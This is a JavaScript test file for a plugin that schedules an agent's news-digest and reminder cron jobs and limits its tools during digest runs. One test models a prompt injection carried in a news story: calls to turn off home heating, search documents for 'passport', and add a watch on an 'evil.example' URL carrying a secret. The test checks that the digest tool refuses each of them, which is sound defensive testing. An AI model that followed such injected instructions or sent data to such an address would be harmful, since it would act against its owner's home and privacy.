import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createTaskHooks, cronJobOfSession, DIGEST_DESCRIPTION, REMINDER_HINT, REMINDER_MARK, reminderHint, reminderJob } from '../plugin/integration-tasks.mjs';
import { createIntegrationTools } from '../plugin/integrations.mjs';
const NONCE = 'a'.repeat(32);
const BASE = {enabled:true,name:'Daily news digest',description:'Created by Portal integrations for the daily news digest. [ODS managed:'+NONCE+']',expr:'30 6 * * *',tz:'Europe/Lisbon',message:'Read the news digest.',timeoutSeconds:600,tools:['pixel_ods_mcp']};
const timers = () => ({setInterval:()=>({unref(){}}),clearInterval(){}});
function fixture(jobs=[]) {
  const state={plan:{...BASE},management:{nonce:NONCE,jobId:null},sent:[],warnings:[]};
  const cron={jobs,calls:[],async list(options){this.calls.push(['list',options]);return structuredClone(this.jobs);},
    async add(job){this.calls.push(['add',job]);const value={id:'created-'+this.calls.length,...structuredClone(job)};this.jobs.push(value);return value;},
    async update(id,patch){this.calls.push(['update',id,patch]);Object.assign(this.jobs.find(x=>x.id===id),structuredClone(patch));},
    async remove(id){this.calls.push(['remove',id]);this.jobs.splice(this.jobs.findIndex(x=>x.id===id),1);return{removed:true};}};
  const submit=async request=>{
    state.sent.push(request);
    if(request.action==='digest-plan')return{ok:true,plan:{...structuredClone(state.plan),management:structuredClone(state.management)}};
    if(request.action==='digest-job-record') {assert.equal(request.nonce,state.management.nonce);assert.ok(state.management.jobId===null||state.management.jobId===request.jobId);state.management.jobId=request.jobId;return{ok:true,recorded:true};}
    if(request.action==='digest-job-clear'){assert.equal(request.jobId,state.management.jobId);state.management=null;return{ok:true,cleared:true};}
    return{ok:true,notified:true};
  };
  const hooks=createTaskHooks({submit,timers:timers(),warn:message=>state.warnings.push(message)});
  return{state,cron,submit,hooks,start:()=>hooks.gatewayStart({}, {getCron:()=>cron})};
}

test('native finished events require explicit Portal ownership and retain exact run identity',async()=>{
 const {state,hooks}=fixture();
 await hooks.cronChanged({action:'started',agentId:'pixel',jobId:'ignored'});
 await hooks.cronChanged({action:'finished',agentId:'other',jobId:'ignored'});
 await hooks.cronChanged({action:'finished',jobId:'unattributed'});
 await hooks.cronChanged({action:'finished',agentId:'pixel',jobId:'j1',status:'error',runAtMs:42,sessionId:'session',sessionKey:'agent:pixel:cron:j1:run:session',runId:'run',summary:'x'.repeat(5000),error:'failed',job:{name:'Backup',description:'Nightly'}});
 assert.equal(state.sent.length,1);assert.equal(state.sent[0].summary.length,4000);
 assert.deepEqual(Object.fromEntries(['sessionId','sessionKey','runId'].map(k=>[k,state.sent[0][k]])),{sessionId:'session',sessionKey:'agent:pixel:cron:j1:run:session',runId:'run'});
});

test('job add records returned identity, keep is stable, full execution drift is repaired, and off removes only that ID',async()=>{
 const foreign={id:'foreign',agentId:'other',description:BASE.description};const f=fixture([foreign]);
 assert.equal(await f.hooks.syncDigest(),'no-cron');assert.equal(await f.start(),'added');
 const id=f.state.management.jobId;assert.ok(id);assert.equal(await f.hooks.syncDigest(),'kept');
 Object.assign(f.cron.jobs.find(j=>j.id===id),{sessionTarget:'main',wakeMode:'next-heartbeat',delivery:{mode:'webhook',to:'https://example.invalid/'},deleteAfterRun:true});
 assert.equal(await f.hooks.syncDigest(),'updated');
 const restored=f.cron.jobs.find(j=>j.id===id);assert.equal(restored.sessionTarget,'isolated');assert.deepEqual(restored.delivery,{mode:'none'});assert.equal(restored.deleteAfterRun,false);
 f.state.plan.enabled=false;assert.equal(await f.hooks.syncDigest(),'removed');assert.equal(f.state.management,null);assert.deepEqual(f.cron.jobs,[foreign]);await f.hooks.gatewayStop();
});

test('same prose does not adopt or delete legacy or foreign agent jobs',async()=>{
 const jobs=[{id:'legacy',agentId:'pixel',description:'Created by Portal integrations for the daily news digest.'},{id:'other-agent',agentId:'another',description:BASE.description}];
 const f=fixture(structuredClone(jobs));assert.equal(await f.start(),'added');
 assert.deepEqual(f.cron.jobs.slice(0,2),jobs);assert.equal(f.cron.calls.filter(x=>x[0]==='remove').length,0);await f.hooks.gatewayStop();
});

test('persisted ID with changed owner or journal marker is refused rather than overwritten',async()=>{
 const f=fixture();await f.start();f.cron.jobs[0].agentId='someone-else';await assert.rejects(f.hooks.syncDigest(),/recorded digest job was changed/);
 assert.equal(f.cron.calls.filter(x=>['update','remove'].includes(x[0])).length,0);await f.hooks.gatewayStop();
});

test('nonce collision or malformed recovery candidate fails closed without deleting duplicates',async()=>{
 const candidate={agentId:'pixel',description:BASE.description,sessionTarget:'isolated',payload:{kind:'agentTurn',lightContext:true}};
 const f=fixture([{id:'a',...candidate},{id:'b',...candidate}]);await f.start();
 assert.match(f.state.warnings[0],/More than one job/);assert.equal(f.cron.calls.filter(x=>x[0]!=='list').length,0);await f.hooks.gatewayStop();
 const g=fixture([{id:'bad',agentId:'pixel',description:BASE.description,sessionTarget:'main'}]);await g.start();assert.match(g.state.warnings[0],/unexpected execution settings/);assert.equal(g.state.management.jobId,null);await g.hooks.gatewayStop();
});

test('crash after native add recovers the durable nonce journal without adding another job',async()=>{
 const f=fixture();let fail=true;
 const hooks=createTaskHooks({timers:timers(),submit:async r=>{if(r.action==='digest-job-record'&&fail){fail=false;throw Error('lost response');}return f.submit(r);}});
 await hooks.gatewayStart({}, {getCron:()=>f.cron});assert.equal(f.state.management.jobId,null);assert.equal(f.cron.jobs.length,1);
 assert.equal(await hooks.syncDigest(),'kept');assert.equal(f.state.management.jobId,f.cron.jobs[0].id);assert.equal(f.cron.calls.filter(x=>x[0]==='add').length,1);await hooks.gatewayStop();
});

test('overlapping syncs add only once and gateway stop blocks queued mutations',async()=>{
 const f=fixture();let release;const gate=new Promise(resolve=>{release=resolve;});const list=f.cron.list.bind(f.cron);
 f.cron.list=async options=>{await gate;return list(options);};const start=f.start();
 await new Promise(resolve=>setImmediate(resolve));const second=f.hooks.syncDigest();const stop=f.hooks.gatewayStop();release();await Promise.all([start,stop]);await assert.rejects(second,/stopped/);
 assert.equal(f.cron.calls.filter(x=>x[0]==='add').length,0);assert.equal(await f.hooks.syncDigest(),'stopped');
});

test('stop waits for an already submitted add and its identity bookkeeping',async()=>{
 const f=fixture();let release,entered;const gate=new Promise(resolve=>{release=resolve;});const began=new Promise(resolve=>{entered=resolve;});const add=f.cron.add.bind(f.cron);
 f.cron.add=async job=>{entered();await gate;return add(job);};const start=f.start();await began;let stopped=false;const stop=f.hooks.gatewayStop().then(()=>{stopped=true;});await new Promise(resolve=>setImmediate(resolve));assert.equal(stopped,false);release();await Promise.all([start,stop]);
 assert.equal(f.state.management.jobId,f.cron.jobs[0].id);assert.equal(f.cron.calls.filter(x=>x[0]==='add').length,1);
 const count=f.cron.calls.length;await f.hooks.syncDigest();assert.equal(f.cron.calls.length,count);
});

// Reminders and the digest run (#8389), on #8293's managed digest job.
function recorder(replies) {
  const sent = [];
  const submit = async payload => {
    sent.push(payload);
    const reply = typeof replies === 'function' ? replies(payload) : replies[payload.action];
    if (reply instanceof Error) throw reply;
    return reply;
  };
  return {sent, submit};
}

function fakeCron(jobs = []) {
  const calls = [];
  return {
    calls, jobs,
    list: async options => { calls.push(['list', options]); return jobs; },
    add: async job => { calls.push(['add', job]); jobs.push({id: `j${jobs.length + 1}`, ...job}); return jobs.at(-1); },
    update: async (id, patch) => { calls.push(['update', id, patch]); },
    remove: async id => { calls.push(['remove', id]); return {removed: true}; },
  };
}

const PLAN = {enabled: true, name: 'Daily news digest', description: 'Created by Portal integrations for the daily news digest.',
  expr: '30 6 * * *', tz: 'Europe/Lisbon', message: 'Read the news digest.', timeoutSeconds: 600,
  tools: ['pixel_ods_mcp']};
// #8293's digest plan: the service holds the job's managed identity, written into its description.
const MANAGED_PLAN = () => ({...PLAN, description: PLAN.description + ' [ODS managed:' + NONCE + ']',
  management: {nonce: NONCE, jobId: null}});

const REMINDER_PLAN = {name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs', atMs: Date.UTC(2026, 10, 3, 16, 22),
  when: 'Tue 03 Nov 2026 at 16:22 WET', text: 'Stretch your legs', runMessage: 'Reply with exactly: Done.'};

test('a reminder becomes a one-off job that deletes itself and runs nothing of note', () => {
  assert.deepEqual(reminderJob(REMINDER_PLAN, 'pixel'), {
    name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs', enabled: true, agentId: 'pixel',
    schedule: {kind: 'at', at: '2026-11-03T16:22:00.000Z'}, sessionTarget: 'isolated', wakeMode: 'now',
    payload: {kind: 'agentTurn', message: 'Reply with exactly: Done.', timeoutSeconds: 60, lightContext: true, toolsAllow: []},
    delivery: {mode: 'none'}, deleteAfterRun: true});
  assert.ok(REMINDER_PLAN.description.startsWith(REMINDER_MARK));
});

test('reminders are scheduled with the gateway cron once it is known', async () => {
  const {submit} = recorder({'digest-plan': {ok: true, plan: {...PLAN, enabled: false}}});
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval() {}}, shared: {}});
  await assert.rejects(hooks.scheduleReminder(REMINDER_PLAN), /scheduler is not ready/);
  const cron = fakeCron();
  await hooks.gatewayStart({}, {getCron: () => cron});
  await hooks.scheduleReminder(REMINDER_PLAN);
  assert.deepEqual(cron.calls.filter(([kind]) => kind === 'add').map(([, job]) => [job.name, job.schedule.kind, job.deleteAfterRun]),
    [['Reminder: Stretch', 'at', true]]);
});

test('a reminder is sent when its job starts, and its run is removed when it ends', async () => {
  const {sent, submit} = recorder({'reminder-due': {ok: true, notified: true}, 'task-finished': {ok: true, notified: false}});
  const warnings = [];
  const cron = fakeCron();
  const hooks = createTaskHooks({submit, warn: message => warnings.push(message)});
  const job = {name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs'};
  await hooks.cronChanged({action: 'added', jobId: 'r1', agentId: 'pixel', job}, {getCron: () => cron});
  await hooks.cronChanged({action: 'started', jobId: 'r1', agentId: 'pixel', job, runAtMs: 5}, {getCron: () => cron});
  await hooks.cronChanged({action: 'finished', jobId: 'r1', agentId: 'pixel', job, status: 'error', error: 'model busy'}, {getCron: () => cron});
  // Another agent's job is not Portal's, even when its description looks like a reminder.
  await hooks.cronChanged({action: 'started', jobId: 'x1', agentId: 'other', job}, {getCron: () => cron});
  assert.deepEqual(sent, [{action: 'reminder-due', jobId: 'r1', name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs'}]);
  assert.deepEqual(cron.calls, [['remove', 'r1']]);
  assert.deepEqual(warnings, []);
});

test('a reminder that cannot be sent is a warning, not a crash', async () => {
  const warnings = [];
  const job = {name: 'Reminder: Tea', description: 'Portal reminder: Tea'};
  const refusing = createTaskHooks({submit: async () => ({ok: false, message: 'notifications off'}), warn: message => warnings.push(message)});
  await refusing.cronChanged({action: 'started', jobId: 'r2', agentId: 'pixel', job});
  const down = createTaskHooks({submit: async () => { throw new Error('down'); }, warn: message => warnings.push(message)});
  await down.cronChanged({action: 'started', jobId: 'r3', agentId: 'pixel', job});
  assert.deepEqual(warnings, ['Portal integrations: reminder not sent: notifications off', 'Portal integrations: reminder failed: down']);
});

test('a scheduler that appears after gateway start is still found for a reminder', async () => {
  const {submit} = recorder({'digest-plan': {ok: true, plan: {...PLAN, enabled: false}}});
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval() {}}});
  let cron;
  // At gateway start OpenClaw has not created its cron service yet.
  await hooks.gatewayStart({}, {getCron: () => cron});
  cron = fakeCron();
  await hooks.scheduleReminder(REMINDER_PLAN);
  assert.equal(cron.calls.filter(([kind]) => kind === 'add').length, 1);
});

test('a reminder set from another instance of the plugin finds the scheduler the gateway gave the first', async () => {
  const shared = {};
  const {submit} = recorder({'digest-plan': {ok: true, plan: {...PLAN, enabled: false}}});
  const timers = {setInterval: () => ({}), clearInterval() {}};
  const hooked = createTaskHooks({submit, timers, shared});
  const tools = createTaskHooks({submit, timers, shared});
  await assert.rejects(tools.scheduleReminder(REMINDER_PLAN), /scheduler is not ready/);
  const cron = fakeCron();
  await hooked.gatewayStart({}, {getCron: () => cron});
  await tools.scheduleReminder(REMINDER_PLAN);
  assert.equal(cron.calls.filter(([kind]) => kind === 'add').length, 1);
  // Separate processes, or tests, keep separate slots.
  await assert.rejects(createTaskHooks({submit, timers, shared: {}}).scheduleReminder(REMINDER_PLAN), /not ready/);
});

test('a turn asking for a reminder is told which tool sets one', () => {
  for (const text of ['Set a reminder for 17:30', 'reminders for tomorrow please', 'remind me at 5pm'])
    assert.equal(reminderHint(text), REMINDER_HINT, text);
  for (const text of ['What is the weather?', 'The reminiscence was nice', 'in 5 minutes, check the build', undefined])
    assert.equal(reminderHint(text), '', String(text));
  // Asking Portal to recall something is no reminder.
  for (const text of ['Can you remind me what my lease deposit was?', 'Remind me who Ana is', 'remind me how the boiler resets', 'Remind me of my sister\'s address'])
    assert.equal(reminderHint(text), '', text);
  // Unless it says when: then it is a reminder after all.
  for (const text of ['Remind me what to buy at 18:00', 'remind me of the dentist tomorrow', 'Remind me what to pack in 30 minutes'])
    assert.notEqual(reminderHint(text), '', text);
  assert.equal(JSON.parse(reminderHint('Remind me what to pack in 30 minutes').match(/args (\{.*?\})\./)[1]).inMinutes, 30);
  assert.match(REMINDER_HINT, /tool_call with id "openclaw:pixel-ods:pixel_ods_notify"/, 'the hint gives the exact call');
  // No number the model could copy: the general hint has placeholders only.
  assert.doesNotMatch(REMINDER_HINT, /"inMinutes": \d|"at": "\d/);
});

test('a reminder hint uses the delay the owner asked for, so the model never copies another number', () => {
  const minutes = text => JSON.parse(reminderHint(text).match(/args (\{.*?\})\./)[1]).inMinutes;
  assert.equal(minutes('Remind me in 3 minutes to drink some water.'), 3);
  assert.equal(minutes('remind me in 1 min'), 1);
  assert.equal(minutes('Remind me in 2 hours to call Ana'), 120);
  assert.equal(minutes('remind me in 1h'), 60);
  assert.equal(minutes('Lembre-me daqui a 10 minutos'), 10);
  assert.equal(minutes('Me lembre em 2 horas'), 120);
  assert.equal(minutes('Lembra-me daqui a 10 minutos de beber água'), 10);
  // Every part of a delay counts: the model copies the number as is.
  assert.equal(minutes('Remind me in 1 hour 30 minutes to leave'), 90);
  assert.equal(minutes('remind me in 1h 30m'), 90);
  assert.equal(minutes('remind me in 2 hours and 15 minutes'), 135);
  assert.equal(minutes('Lembra-me daqui a 1 hora e 30 minutos'), 90);
  assert.equal(minutes('Remind me in 10 minutes to call 2 people'), 10, 'a later number that is no delay is not added');
  assert.match(reminderHint('Remind me in 3 minutes'), /tool_call with id "openclaw:pixel-ods:pixel_ods_notify"/);
});

test('the digest description is the service\'s own', () => {
  const service = fs.readFileSync(new URL('../host/integrations_apps.py', import.meta.url), 'utf8');
  assert.ok(service.includes(`DIGEST_MARKER = "${DIGEST_DESCRIPTION}"`));
  assert.equal(cronJobOfSession('agent:pixel:cron:4F2a-9c'), '4f2a-9c');
  assert.equal(cronJobOfSession('agent:pixel:cron:job-1:run:1793816393'), 'job-1');
  for (const other of ['agent:pixel:openai-user:ods-' + 'a'.repeat(64), 'agent:pixel:main', '', undefined]) assert.equal(cronJobOfSession(other), '');
});

test('a digest run is known from the sync, its start, or the scheduler; chats and other tasks are not digest runs', async () => {
  const {submit} = recorder(payload => (payload.action === 'digest-plan' ? {ok: true, plan: MANAGED_PLAN()} : {ok: true}));
  const cron = fakeCron([{id: 'Nightly-Backup', description: 'Back up the photos'}]);
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval: () => {}}, shared: {}});
  await hooks.gatewayStart({}, {getCron: () => cron});
  const digestId = cron.jobs.find(job => job.description.startsWith(DIGEST_DESCRIPTION)).id;
  assert.equal(await hooks.isDigestRun(`agent:pixel:cron:${digestId}`), true);
  assert.equal(await hooks.isDigestRun('agent:pixel:cron:nightly-backup'), false);
  assert.equal(await hooks.isDigestRun('agent:pixel:openai-user:ods-' + 'a'.repeat(64)), false);
  assert.equal(await hooks.isDigestRun('agent:pixel:cron:vanished'), true, 'a run nobody can name may only read the digest');
  // Seen when it starts, before its run calls a tool.
  const started = createTaskHooks({submit, shared: {}});
  await started.cronChanged({action: 'started', jobId: 'D9', agentId: 'pixel', job: {description: DIGEST_DESCRIPTION}});
  assert.equal(await started.isDigestRun('agent:pixel:cron:d9'), true);
  // Asked of the scheduler when the hooks never saw it.
  const fresh = createTaskHooks({submit, shared: {}});
  await fresh.gatewayStart({}, {getCron: () => fakeCron([{id: 'late', description: DIGEST_DESCRIPTION}])});
  assert.equal(await fresh.isDigestRun('agent:pixel:cron:late'), true);
});

test('in the digest run, the app tool reads the digest and nothing else', async () => {
  const sent = [];
  const submit = async payload => { sent.push(payload); return {ok: true, text: 'Stories', isError: false, servers: []}; };
  const mcp = isDigestRun => createIntegrationTools({submit, sessionKey: 'agent:pixel:cron:d1', isDigestRun}).find(tool => tool.name === 'pixel_ods_mcp');
  const digest = mcp(async () => true);
  // A story that says "turn the heating off" or "watch this page" gets nowhere.
  for (const params of [{action: 'list'}, {action: 'call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}},
    {action: 'call', server: 'app:watch', tool: 'add', arguments: {url: 'https://evil.example/?d=secret'}},
    {action: 'call', server: 'app:documents', tool: 'search', arguments: {query: 'passport'}},
    {action: 'call', server: 'news', tool: 'digest', arguments: {}}]) {
    const refused = await digest.execute('1', params);
    assert.equal(refused.isError, true, JSON.stringify(params));
    assert.match(refused.content[0].text, /may only read the digest/);
  }
  assert.deepEqual(sent, []);
  const read = await digest.execute('2', {action: 'call', server: 'app:news', tool: 'digest', arguments: {limit: 9999, extra: 'x'}});
  assert.equal(read.content[0].text, 'Stories');
  assert.deepEqual(sent, [{action: 'mcp-call', server: 'app:news', tool: 'digest', arguments: {}}]);
  // Anywhere else the tool works as before.
  await mcp(async () => false).execute('3', {action: 'call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}});
  assert.deepEqual(sent.at(-1), {action: 'mcp-call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}});
});

test('a notification with empty reminder fields is sent now, not refused as a reminder', async () => {
  const sent = [];
  const notify = createIntegrationTools({submit: async payload => { sent.push(payload); return {ok: true}; }}).find(tool => tool.name === 'pixel_ods_notify');
  for (const params of [{message: 'Build done', inMinutes: null, at: null}, {message: 'Build done', at: ''}]) {
    const reply = await notify.execute('1', params);
    assert.equal(reply.content[0].text, 'Notification sent.');
  }
  assert.deepEqual(sent.map(item => item.action), ['notify', 'notify']);
});
